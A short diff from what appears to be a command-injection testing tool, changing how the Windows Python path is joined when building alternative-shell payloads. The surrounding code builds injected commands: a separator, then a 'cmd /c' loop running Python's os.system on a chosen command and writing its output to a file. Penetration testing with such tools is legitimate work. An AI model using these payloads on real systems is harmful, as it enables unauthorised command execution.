@@ -45,7 +45,7 @@ __Warning__: The alternative shells are still experimental.
 def decision_alter_shell(separator, TAG, OUTPUT_TEXTFILE):
 
   if settings.TARGET_OS == "win":
-    python_payload = settings.WIN_PYTHON_DIR + "python.exe -c \"open('" + OUTPUT_TEXTFILE + "','w').write('" + TAG + "')\""
+    python_payload = settings.WIN_PYTHON_DIR + " -c \"open('" + OUTPUT_TEXTFILE + "','w').write('" + TAG + "')\""
     payload = (separator +
               "for /f \"delims=\" %i in ('cmd /c " + 
               python_payload +
@@ -103,7 +103,7 @@ def cmd_execution_alter_shell(separator, cmd, OUTPUT_TEXTFILE):
       payload = (separator +cmd + " "
                 )
     else:
-      python_payload = settings.WIN_PYTHON_DIR + "python.exe -c \"import os; os.system('" + cmd + ">" + OUTPUT_TEXTFILE + "')\""
+      python_payload = settings.WIN_PYTHON_DIR + " -c \"import os; os.system('" + cmd + ">" + OUTPUT_TEXTFILE + "')\""
       payload = (separator +
                 "for /f \"delims=\" %i in ('cmd /c " + 
                 python_payload +
